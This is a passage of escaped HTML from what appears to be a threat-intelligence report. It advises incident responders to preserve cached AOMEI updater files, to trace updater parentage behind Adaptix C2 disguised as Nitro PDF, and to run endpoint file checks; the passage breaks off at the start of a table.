style\u003d\"vertical-align:baseline\"\u003e: Defenders must not rely on live web checks. Incident responders must preserve and analyze the endpoint-cached configuration files in \u003c/span\u003e\u003ccode style\u003d\"vertical-align:baseline\"\u003e%PROGRAMFILES(X86)%\\AOMEI\\*\\Tmphtml\\\u003c/code\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003e and review proxy/firewall telemetry corresponding to the precise second the alert was triggered.\u003c/span\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4\u003e\u003cspan style\u003d\"font-style:italic;vertical-align:baseline\"\u003eCamouflaged Follow-on Activity\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eThe deployment of Adaptix C2 under the guise of Nitro PDF can mislead analysts into treating alerts as isolated, user-initiated software downloads rather than staged lateral movement. Responders must trace updater parentage to identify root-cause supply chain tampering.\u003c/span\u003e\u003c/p\u003e\n\u003ch4\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eEndpoint and Network Hardening Actions\u003c/span\u003e\u003c/h4\u003e\n\u003ch4\u003e\u003cspan style\u003d\"font-style:italic;vertical-align:baseline\"\u003eEndpoint File Checks\u003c/span\u003e\u003c/h4\u003e\n\u003cp\u003e\u003cspan style\u003d\"vertical-align:baseline\"\u003eInspect systems for the following directories and artifacts. Defenders must distinguish between malicious payloads and legitimate signed binaries abused for search-order hijacking:\u003c/span\u003e\u003c/p\u003e\n\u003cdiv align\u003d\"left\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\n\u003cdiv style\u003d\"color:#5f6368;overflow-x:auto;overflow-y:hidden;width:100%\"\u003e\u003ctable\u003e\u003ccolgroup\u003e\u003ccol\u003e\u003ccol\u003e\u003ccol\u003e\u003ccol\u003e\u003c/colgroup\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd
